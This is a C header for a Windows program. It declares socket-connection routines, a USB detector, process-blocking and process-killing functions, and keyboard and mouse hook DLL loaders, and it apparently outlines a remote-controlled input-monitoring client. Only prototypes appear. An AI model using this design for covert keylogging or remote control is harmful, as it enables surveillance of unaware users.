#ifndef __MODULES_H__
#define __MODULES_H__


#include <windows.h>
#include <stdio.h>
#include <process.h>
#include <winreg.h>
#include <direct.h>
#include <tchar.h>
#include <locale.h>
#include <TlHelp32.h>

#define BUF_SIZE 256
#define FILE_BUF 1024

#define DEBUG

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
void RecvProc();
unsigned int WINAPI ConnectProc(void * lpParam);
unsigned int WINAPI USBDetector(void *lpParam);
unsigned int WINAPI ProcessBlocker(void *lpParam);
void CreateSocket();
int KillProcess(TCHAR* name);
void ReadAddr();


extern HINSTANCE g_hInst;
extern LPCTSTR lpszClass;
extern HWND hWndMain;
extern SOCKET hSocket;
extern SOCKADDR_IN hAddr;
extern HANDLE hFile;
extern HANDLE Con_pThread,USB_pThread;
extern DWORD dwResult;
extern BOOL isEof;
extern char ip[17];
extern char Port[6];


typedef BOOL(*HookProc)();

extern HINSTANCE KhinstDll;//로드할 인스턴스형태의 dll변수 키보드훅
extern HINSTANCE MhinstDll;//마우스훅

extern HookProc Kinstallhook;//키보드
extern HookProc Kuninstallhook;

extern HookProc Minstallhook;//마우스
extern HookProc Muninstallhook;

#endif